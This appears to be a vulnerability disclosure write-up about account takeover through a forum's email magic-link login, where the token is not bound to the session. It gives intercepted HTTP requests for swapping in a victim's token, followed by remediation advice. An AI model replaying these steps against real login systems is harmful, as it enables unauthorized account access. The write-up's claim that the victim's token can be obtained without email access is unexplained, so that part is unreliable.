# [Write-up #02] Account Takeover via Improper Email Login Token Validation (Session-Token Mismatch)

## 📝 Overview
This report details a critical authentication bypass vulnerability in a forum platform's email-based login system. The flaw allows an attacker to compromise any user account by exploiting the lack of server-side binding between a login token and the requester's session. An attacker can initiate a login flow for themselves and then substitute their token with a victim's token to gain unauthorized access.

* **Vulnerability Type:** Account Takeover (ATO) / Broken Authentication
* **CVSS Score:** `8.3 (High)` -> [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
* **Target Category:** Community Forum Software / Enterprise Support Portals

---

## 🔍 Vulnerability Analysis
The application implements a "Magic Link" login mechanism via email. However, the implementation fails at a fundamental security level: **The Login Token is not bound to the User Session.**

### ⚠️ The Logic Flaw:
The server processes the login token as a standalone proof of identity. It does not verify if the `_forum_session` cookie (belonging to the attacker) matches the intent of the `login_token` (belonging to the victim). By manipulating the request path and the `Referer` header in a controlled intercept, the attacker can "swap" the identity context mid-flow.

---

## 🚀 Attack Scenario (Step-by-Step)

### 1. Preparation
* **Attacker Email:** `attacker@example.com`
* **Victim Email:** `victim@example.com`
* **Condition:** The attacker must be able to trigger a login email for the victim (no access to the victim's email is required, only the token value).

### 2. Initiating the Attacker's Session
1. The attacker requests a login link for their own account.
2. In Burp Suite, **Intercept** is turned ON.
3. The attacker clicks their own link to capture the baseline request:

```http
GET /session/email-login/←ATTACKER_TOKEN→.json HTTP/2
Host: ←TARGET_DOMAIN→
Referer: https://←TARGET_DOMAIN→/session/email-login/←ATTACKER_TOKEN→
Cookie: _forum_session=←ATTACKER_SESSION_ID→
```
### 3. Token Substitution (The Exploit)
The attacker triggers a login link for the Victim and obtains the victim's token.
In the captured request from Step 2, the attacker replaces their token with the Victim's Token in both the URL path and the Referer header:
```http
GET /session/email-login/←VICTIM_TOKEN→.json HTTP/2
Host: ←TARGET_DOMAIN→
Referer: https://←TARGET_DOMAIN→/session/email-login/←VICTIM_TOKEN→
```
### 4. Finalizing the Takeover
Upon forwarding the modified request, the server responds with a confirmation page: "Logging in as victim@example.com".
The attacker clicks "Finish Login". A final POST request is sent:
```http
POST /session/email-login/←VICTIM_TOKEN→ HTTP/2
Host: ←TARGET_DOMAIN→
Referer: https://←TARGET_DOMAIN→/session/email-login/←VICTIM_TOKEN→
```
Result: The server validates the ←VICTIM_TOKEN→ but applies the authentication state to the ←ATTACKER_SESSION_ID→.
### 🛡️ Impact
Zero-Interaction ATO: The victim does not need to click any link or be online.
Mass Exploitation: An attacker can iterate through tokens to compromise high-privilege accounts.
Bypass of Standard Controls: Renders standard session isolation and password protections ineffective.
🛠️ Root Cause & Remediation
Root Cause
The application lacks Cryptographic Binding between the login token and the browser session. It trusts the token implicitly regardless of who presents it.
### Remediation Recommendations
Strict Token Binding: Bind each login token to the specific email and the session ID that initiated the request.
Single-Use & Short TTL: Tokens must be invalidated immediately after one use.
Server-Side Consistency Check: Verify that the token, session cookie, and target user ID all align.
Anti-CSRF Protection: Ensure robust CSRF tokens are integrated into the login flow.
### 📊 Status
Milestone Date
Vulnerability Discovered 2026-03-26
Reported to Vendor 2026-03-26
Status ✅ Fixed / Resolved
